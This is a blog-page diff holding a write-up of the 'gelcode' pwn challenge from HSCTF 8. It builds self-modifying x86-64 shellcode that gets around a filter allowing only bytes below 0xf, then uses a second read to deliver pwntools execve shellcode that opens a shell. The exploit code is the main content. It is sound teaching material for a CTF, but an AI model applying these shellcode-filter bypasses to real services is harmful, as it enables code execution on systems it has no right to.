@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
+<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
+<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>gelcode [hsctf8]</title><!-- Begin Jekyll SEO tag v2.7.1 -->
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="gelcode [hsctf8]" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="gelcode" />
+<meta property="og:description" content="gelcode" />
+<link rel="canonical" href="http://localhost:4000/pwn/2021/06/26/gelcode.html" />
+<meta property="og:url" content="http://localhost:4000/pwn/2021/06/26/gelcode.html" />
+<meta property="og:site_name" content="k1R4’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-26T14:30:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="gelcode [hsctf8]" />
+<script type="application/ld+json">
+{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn/2021/06/26/gelcode.html"},"@type":"BlogPosting","url":"http://localhost:4000/pwn/2021/06/26/gelcode.html","headline":"gelcode [hsctf8]","dateModified":"2021-06-26T14:30:00+05:30","datePublished":"2021-06-26T14:30:00+05:30","description":"gelcode","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/blog</a></li><li><a href="/about/">/about</a></li><li><a href="/contact/">/contact</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="gelcode-">gelcode <br /><br /></h1>
+
+<p>Ah yes another shellcoding challenge! It seems impossible at first glance. ASCII value of our input is required to be less than 0xf, or its replaced with a null byte.</p>
+
+<p><img src="/images/gelcode/decompilation.png" alt="decompilation_of_main" /></p>
+
+<p>So to workaround this constraint we will be writing self-modifying shellcode. But first, here is the register state we are working with:</p>
+
+<p><img src="/images/gelcode/regstate.png" alt="register_state" /></p>
+
+<p>Our aim here is to do a read syscall on our input buffer, so we can give execve shellcode without contrainst. To do that we need to set rdi to 0 (stdin) and rdx to a small value so that we dont go beyond the heap boundary which will fail the syscall. Analysing all possible instructions with depth 3, these seem rather interesting:</p>
+
+<p><code class="language-plaintext highlighter-rouge">add     DWORD PTR [rdx+rax*1], eax
+add     al,0x(0-f)</code></p>
+
+<p>With this we can modify our input but the problem is we can add only the index of our input byte to itself. To workarond that we will be using these:</p>
+
+<p><code class="language-plaintext highlighter-rouge">add    BYTE PTR [rdx+rax*1], cl
+add    cl, BYTE PTR [rdx+rax*1]</code></p>
+
+<p>This gives us independent control over index and value that is added to our input bytes. But since the value of cl is not what we want, we first have to write shellcode that modifies itself to perform <code class="language-plaintext highlighter-rouge">xor rcx,rcx</code>. After a bit of head scratching and some quick maths, we have ourselves shellcode to perform, <code class="language-plaintext highlighter-rouge">xor rcx,rcx</code>.</p>
+
+<figure class="highlight"><pre><code class="language-py" data-lang="py"><span class="n">shell1</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+    add     al,0xf
+    add     al,0xf
+    add     al,0x6
+    add     DWORD PTR [rdx+rax*1], eax 
+    add     DWORD PTR [rdx+rax*1], eax
+    add     al,0x1
+    add     DWORD PTR [rdx+rax*1], eax
+    
+    add     al,0x1
+    add     DWORD PTR [rdx+rax*1], eax 
+    add     DWORD PTR [rdx+rax*1], eax
+    add     DWORD PTR [rdx+rax*1], eax 
+    add     DWORD PTR [rdx+rax*1], eax
+    add     DWORD PTR [rdx+rax*1], eax
+    add     al,0xf
+    """</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\x00\x0c\x0b</span><span class="s">"</span></code></pre></figure>
+<p><br /></p>
+
+<p>Now our aim is to get the shellcode to do the following:</p>
+
+<p><code class="language-plaintext highlighter-rouge">xor rdi,rdi
+mov rdx, 0x500
+xor eax,eax
+syscall</code></p>
+
+<p>Since rsi is already set, this will result in a read syscall.
+Next we have to set cl to a value that makes it easier for us, since every byte that we want can be represented as <code class="language-plaintext highlighter-rouge">0x18*n+0x(0-f)</code>, we shall set cl to 0x18 then use the add instruction multiple times until we get our desired byte. The remainder of the byte is directly given as input. Now time to set cl and spam add instructions xD. To keep the writeup short, I shall be appending (x N) at the end of add instructions to the amount of adds used.</p>
+
+<figure class="highlight"><pre><code class="language-py" data-lang="py"><span class="n">shell2</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+    add    al,0x6
+    add    cl, BYTE PTR [rdx+rax*1] (x 6)
+    add    al,0xf (x 11)
+
+    add    al,0x5
+    add    BYTE PTR [rdx+rax*1], cl (x 3)
+
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 2)
+
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 10)
+    
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 3)
+
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    
+    add    al,0x5
+    add    BYTE PTR [rdx+rax*1], (cl x 2)
+
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    """</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x01\x0f</span><span class="s">"</span><span class="o">+</span><span class="s">"</span><span class="se">\x00\x07\x02\x00\x05\x00\x00</span><span class="s">"</span><span class="o">+</span><span class="s">"</span><span class="se">\x01\x00</span><span class="s">"</span> <span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="s">"syscall"</span><span class="p">)</span></code></pre></figure>
+<p><br /></p>
+
+<p>Now time to finish the exploit:</p>
+
+<figure class="highlight"><pre><code class="language-py" data-lang="py"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shell1</span> <span class="o">+</span> <span class="n">shell2</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">999</span><span class="p">,</span><span class="s">"A"</span><span class="p">)</span>
+
+<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="n">sl</span><span class="p">(</span><span class="mi">243</span><span class="o">*</span><span class="s">"A"</span><span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">()))</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+<p><br /></p>
+
+
+    </main><footer>
+  follow me on <a href="https://twitter.com/__k1R4">twitter</a> :)
+</footer>
+</div>
+  </body>
+</html>
